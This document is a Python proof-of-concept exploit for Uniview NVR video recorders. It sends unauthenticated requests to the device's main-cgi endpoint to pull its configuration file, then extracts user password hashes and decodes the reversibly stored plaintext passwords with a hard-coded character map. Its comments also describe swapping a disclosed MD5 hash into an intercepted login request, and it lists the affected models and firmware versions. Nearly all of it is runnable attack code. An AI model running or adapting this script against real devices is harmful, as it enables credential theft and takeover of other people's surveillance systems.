# Uniview NVR remote passwords disclosu# Author: B1t (converted to Python 3, local file mode added)

# The Uniview NVR web application does not enforce authorizations on the main.cgi file when requesting json data.
# It says that you can do anything without authentication, however you must know the request structure.
# In addition, the users' passwords are both hashed and also stored in a reversible way
# The POC below remotely downloads the device's configuration file, extracts the credentials
# and decodes the reversible password strings using my crafted map

# It is worth mention that when you login, the javascript hashes the password with MD5 and pass the request.
# If the script does retrieve the hash and not the password, you can intercept the request and replace the generated
# MD5 with the one disclosed using this script


# Tested on the following models:
#   NVR304-16E - Software Version B3118P26C00510
#   NVR301-08-P8 - Software Version B3218P26C00512
#                  and version B3220P11
#
# Other versions may also be affected


# Usage:
#   Remote:  python nvr_code.py http://Host_or_IP:PORT
#   Local:   python nvr_code.py --file config.xml


import requests
import xml.etree.ElementTree as ET
import sys
import argparse


def decode_pass(rev_pass):
    pass_dict = {
        '77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7', '68': '8', '69': '9',
        '76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^', '90': '&', '86': '*',
        '84': '(', '85': ')', '81': '-', '35': '_', '65': '=', '87': '+', '83': '/', '32': '\\', '0': '|',
        '80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82': '.', '67': '?', '64': '<', '66': '>',
        '2': '~', '39': '[', '33': ']', '94': '"', '91': "'", '28': '`',
        '61': 'A', '62': 'B', '63': 'C', '56': 'D', '57': 'E', '58': 'F', '59': 'G',
        '52': 'H', '53': 'I', '54': 'J', '55': 'K', '48': 'L', '49': 'M', '50': 'N', '51': 'O',
        '44': 'P', '45': 'Q', '46': 'R', '47': 'S', '40': 'T', '41': 'U', '42': 'V', '43': 'W',
        '36': 'X', '37': 'Y', '38': 'Z',
        '29': 'a', '30': 'b', '31': 'c', '24': 'd', '25': 'e', '26': 'f', '27': 'g',
        '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm', '18': 'n', '19': 'o',
        '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't', '9': 'u', '10': 'v', '11': 'w',
        '4': 'x', '5': 'y', '6': 'z',
    }
    rev_pass = rev_pass.split(";")
    pass_len = len(rev_pass) - rev_pass.count("124")
    password = ""
    for char in rev_pass:
        if char != "124":
            password = password + pass_dict[char]
    return pass_len, password


def extract_users(root):
    user_cfg = root.find("UserCfg")
    if user_cfg is None:
        print("[-] No UserCfg section found in the config.")
        sys.exit(1)

    print("[+] Number of users found: " + user_cfg.get("Num", "unknown"))
    print("\n[+] Extracting users' hashes and decoding reversible strings:\n")
    users = list(user_cfg)

    print(f"{'User':<15} | {'Hash':<35} | {'Password'}")
    print("-" * 75)
    for user in users:
        rev = user.get("RvsblePass", "")
        username = user.get("UserName", "")
        userhash = user.get("UserPass", "")
        if rev:
            _, p = decode_pass(rev)
        else:
            p = "(none)"
        print(f"{username:<15} | {userhash:<35} | {p}")

    print("\n *Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely")


def main():
    print("\nUniview NVR remote passwords disclosure!")
    print("Author: B1t\n")

    parser = argparse.ArgumentParser(description="Uniview NVR credential extractor")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("url", nargs="?", help="Target URL (e.g. http://192.168.1.5:80)")
    group.add_argument("--file", "-f", help="Path to a local NVR config XML file")
    args = parser.parse_args()

    if args.file:
        # --- Local file mode ---
        print(f"[+] Reading config from local file: {args.file}")
        tree = ET.parse(args.file)
        root = tree.getroot()
        extract_users(root)

    else:
        # --- Remote mode ---
        host = args.url
        if not host.startswith("http://") and not host.startswith("https://"):
            print("Error: URL must start with http:// or https://")
            sys.exit(1)

        print("[+] Getting model name and software version...")
        r = requests.get(host + '/cgi-bin/main-cgi?json={"cmd": 116}')
        if r.status_code != 200:
            print("Failed fetching version, got status code: " + str(r.status_code))
        else:
            print("Model: " + r.text.split('szDevName":\t"')[1].split('",')[0])
            print("Software Version: " + r.text.split('szSoftwareVersion":\t"')[1].split('",')[0])

        print("\n[+] Getting configuration file...")
        r = requests.get(host + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":8888888888}')
        if r.status_code != 200:
            print("Failed fetching configuration file, response code: " + str(r.status_code))
            sys.exit(1)
        root = ET.fromstring(r.text)
        extract_users(root)


if __name__ == "__main__":
    main()